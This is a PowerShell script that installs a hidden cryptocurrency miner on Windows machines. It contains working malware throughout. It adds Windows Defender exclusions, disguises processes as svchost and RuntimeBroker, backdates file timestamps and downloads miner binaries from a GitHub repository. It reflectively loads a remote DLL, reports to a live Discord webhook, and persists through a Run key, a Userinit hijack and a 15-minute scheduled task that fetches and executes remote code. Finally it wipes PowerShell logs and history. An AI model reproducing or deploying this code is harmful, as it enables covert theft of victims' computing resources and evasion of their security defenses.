# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$Wallet = "1871092382" # Mining Key
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- CLEANUP OLD INSTANCE (kill old processes + delete old binaries for fresh update) ---
$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
$killNames = @("svchost_x", "RuntimeBroker_x", "SecurityHealthService_x", "SearchIndexer_x", "spoolsv_x", "ctfmon_x", "WinSysHelper")
foreach ($k in $killNames) {
    try { Stop-Process -Name $k -Force -ErrorAction SilentlyContinue } catch { }
}
# Delete old miner binaries so they re-download fresh
if (Test-Path $StealthDir) {
    Get-ChildItem $StealthDir -Filter "*_x.exe" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $StealthDir -Filter "*_g.exe" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Milliseconds 500

# --- SINGLE-INSTANCE MUTEX (prevent double-runs from scheduled task + registry) ---
$MutexName = "Global\WinSysUpdatesMtx_7f3a"
$script:Mutex = $null
try {
    $script:Mutex = [System.Threading.Mutex]::OpenExisting($MutexName)
    # Already running, bail out
    exit
} catch {
    $script:Mutex = New-Object System.Threading.Mutex($true, $MutexName)
}

# --- STEALTH SETUP ---
$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
    # Hide the folder
    (Get-Item $StealthDir).Attributes = 'Hidden','System','Directory'
}

# --- CHECK ADMIN (skip admin-only optimizations on non-admin machines) ---
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($IsAdmin) {
    # --- WINDOWS DEFENDER EXCLUSION ---
    try {
        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "svchost_x.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "RuntimeBroker_x.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "SecurityHealthService_x.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "SearchIndexer_x.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "spoolsv_x.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "ctfmon_x.exe" -ErrorAction SilentlyContinue
    } catch { }

    # --- DISABLE SLEEP/HIBERNATE ---
    try {
        powercfg /change standby-timeout-ac 0 2>$null
        powercfg /change standby-timeout-dc 0 2>$null
        powercfg /change hibernate-timeout-ac 0 2>$null
        powercfg /change hibernate-timeout-dc 0 2>$null
        powercfg /hibernate off 2>$null
        powercfg /change monitor-timeout-ac 0 2>$null
    } catch { }

    # --- DISABLE UNNECESSARY SERVICES (Free up L3 cache/cycles) ---
    try {
        $services = @("WSearch", "SysMain", "Cortana")
        foreach ($s in $services) {
            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
        }
    } catch { }

    # --- DISABLE POWER THROTTLING ---
    try {
        $throttlePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"
        if (-not (Test-Path $throttlePath)) { New-Item -Path $throttlePath -Force | Out-Null }
        Set-ItemProperty -Path $throttlePath -Name "PowerThrottlingOff" -Value 1 -Type DWord -ErrorAction SilentlyContinue
    } catch { }

    # --- ENABLE HUGE PAGES ---
    try {
        $tmpCfg = Join-Path $StealthDir "sp.cfg"
        $tmpDb = Join-Path $StealthDir "sp.sdb"
        secedit /export /cfg $tmpCfg /areas USER_RIGHTS 2>$null
        $cfg = Get-Content $tmpCfg -Raw -ErrorAction SilentlyContinue
        $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
        if ($cfg -and $cfg -notmatch $sid) {
            if ($cfg -match "SeLockMemoryPrivilege") {
                $cfg = $cfg -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid"
            } else {
                $cfg = $cfg + "`nSeLockMemoryPrivilege = *$sid`n"
            }
            Set-Content $tmpCfg $cfg
            secedit /configure /db $tmpDb /cfg $tmpCfg /areas USER_RIGHTS 2>$null
        }
        Remove-Item $tmpCfg -Force -ErrorAction SilentlyContinue
        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
    } catch { }
}

# --- PERSIST RANDOM NAME (use same name across reboots, don't pile up duplicates) ---
$NameFile = Join-Path $StealthDir ".maskedname"
$Masks = @("svchost", "RuntimeBroker", "SecurityHealthService", "SearchIndexer", "spoolsv", "ctfmon")
if (Test-Path $NameFile) {
    $RandomName = Get-Content $NameFile -ErrorAction SilentlyContinue
    # Validate it's still a legit mask name
    if ($Masks -notcontains $RandomName) {
        $RandomName = Get-Random -InputObject $Masks
        Set-Content -Path $NameFile -Value $RandomName -Force
    }
} else {
    $RandomName = Get-Random -InputObject $Masks
    Set-Content -Path $NameFile -Value $RandomName -Force
    (Get-Item $NameFile).Attributes = 'Hidden'
}

$MaskedCpu = Join-Path $StealthDir ($RandomName + "_x.exe")
$MaskedGpu = Join-Path $StealthDir ($RandomName + "_g.exe")
$MaskedHost = Join-Path $StealthDir "WinSysHelper.exe"

# Copy PowerShell to a masked name to hide in Task Manager
if (-not (Test-Path $MaskedHost)) {
    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $MaskedHost -Force
    $OldDate = Get-Date -Year 2021 -Month 3 -Day 22
    (Get-Item $MaskedHost).CreationTime = $OldDate
    (Get-Item $MaskedHost).LastWriteTime = $OldDate
}

# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- DOWNLOAD HELPER (handles GitHub redirects properly) ---
function Safe-Download {
    param([string]$Url, [string]$OutPath)
    try {
        # Invoke-WebRequest follows redirects properly unlike WebClient
        Invoke-WebRequest -Uri $Url -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
        if (Test-Path $OutPath) {
            $size = (Get-Item $OutPath).Length
            if ($size -lt 10000) {
                # Got an HTML error page, not a binary — delete it
                Remove-Item $OutPath -Force
                return $false
            }
            $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
            (Get-Item $OutPath).CreationTime = $OldDate
            (Get-Item $OutPath).LastWriteTime = $OldDate
            return $true
        }
    } catch { }
    return $false
}

# 1. Handle CPU Miner
if (-not (Test-Path $MaskedCpu)) {
    $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
    $result = Safe-Download -Url $RawMinerUrl -OutPath $MaskedCpu
    if (-not $result) {
        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/win_sys_x.exe"
        Safe-Download -Url $FallbackUrl -OutPath $MaskedCpu | Out-Null
    }
}

# 2. Detect DISCRETE GPU only (skip integrated Radeon/Intel HD — they can't mine ETCHASH)
$HasGpu = $null
$IsAmd = "false"
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        $name = $vc.Name
        $vramGB = [math]::Round($vc.AdapterRAM / 1GB, 1)
        
        # Only target cards with 3GB+ VRAM (Etchash requirement)
        if ($vc.AdapterRAM -ge 2.5GB) {
            # NVIDIA discrete GPUs
            if ($name -match "GeForce|Quadro|Tesla|RTX A") {
                $HasGpu = $true; $IsAmd = "false"
            }
            # AMD discrete GPUs
            if ($name -match "Radeon.*(RX|R[5-9]|Pro|Vega|VII)") {
                $HasGpu = $true; $IsAmd = "true"
            }
        }
    }
} catch { }

if ($HasGpu -and -not (Test-Path $MaskedGpu)) {
    $GpuFile = if ($IsAmd -eq "false") { "win_sys_t.exe" } else { "win_sys_a.exe" }
    $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/$GpuFile"
    
    # Official Direct Fallbacks (if your GitHub upload failed)
    $OfficialUrl = if ($IsAmd -eq "false") { 
        "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"
    } else { 
        "https://github.com/todxx/teamredminer/releases/download/v0.10.21/teamredminer-v0.10.21-win.zip"
    }

    $result = Safe-Download -Url $RawGpuUrl -OutPath $MaskedGpu
    if (-not $result) {
        # If your repo fails, download zip, extract, and rename
        $tmpZip = Join-Path $StealthDir "tmp.zip"
        $tmpDir = Join-Path $StealthDir "tmp_ext"
        if (Safe-Download -Url $OfficialUrl -OutPath $tmpZip) {
            Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
            $exeName = if ($IsAmd -eq "false") { "t-rex.exe" } else { "teamredminer.exe" }
            $foundExe = Get-ChildItem -Path $tmpDir -Filter $exeName -Recurse | Select-Object -First 1
            if ($foundExe) {
                Move-Item $foundExe.FullName $MaskedGpu -Force
                $result = $true
            }
            Remove-Item $tmpZip, $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- REFLECTIVE LOADING ---
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
    $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))

    $GpuArg = if ($HasGpu) { $MaskedGpu } else { "" }

    $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook|$GithubUser|$RepoName"
    $startMethod.Invoke($null, @([string]$combinedArgs))
} catch {
    $errMsg = "Deployment Error on " + $env:COMPUTERNAME + ": " + $_.Exception.Message
    $json = @{ content = $errMsg } | ConvertTo-Json
    try {
        Invoke-WebRequest -Uri $Webhook -Method POST -Body $json -ContentType "application/json" -UseBasicParsing | Out-Null
    } catch { }
}

# --- USER-MODE PERSISTENCE (GHOST LAYER) ---
$ScriptUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1"
$PayloadArgs = "-NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('$ScriptUrl')`""
$FullPayload = "`"$MaskedHost`" $PayloadArgs"

try {
    # 1. Registry Run Key
    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $FullPayload -ErrorAction SilentlyContinue

    # 2. Userinit Hijack
    $WinlogonPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon"
    if (-not (Test-Path $WinlogonPath)) { New-Item -Path $WinlogonPath -Force | Out-Null }
    $NewInit = "C:\Windows\system32\userinit.exe, $FullPayload"
    Set-ItemProperty -Path $WinlogonPath -Name "Userinit" -Value $NewInit -ErrorAction SilentlyContinue

    # 3. Scheduled Task (Immortal Trigger)
    $TaskName = "WinSysMaintenance"
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        $Action = New-ScheduledTaskAction -Execute $MaskedHost -Argument $PayloadArgs
        $Trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 0)
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Description "Windows System Maintenance Task" -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    try {
        schtasks.exe /create /sc minute /mo 15 /tn "WinSysMaintenance" /tr "$FullPayload" /f 2>$null
    } catch { }
}

# --- POWERSHELL LOG CLEANUP ---
try {
    if ($IsAdmin) {
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
    }
    # Console history cleanup works without admin
    Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
} catch { }
